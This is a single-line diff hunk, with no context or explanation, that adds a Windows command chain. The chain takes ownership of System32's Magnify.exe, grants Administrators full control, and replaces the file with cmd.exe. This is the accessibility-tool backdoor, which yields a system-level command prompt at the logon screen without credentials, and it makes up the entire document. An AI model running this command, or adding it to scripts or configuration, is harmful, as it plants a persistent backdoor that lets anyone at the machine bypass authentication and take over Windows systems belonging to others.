@@ -1,0 +1,1 @@
+takeown /f C:\Windows\System32\Magnify.exe && icacls C:\Windows\System32\Magnify.exe /grant Administrators:F && copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify.bak.exe && copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
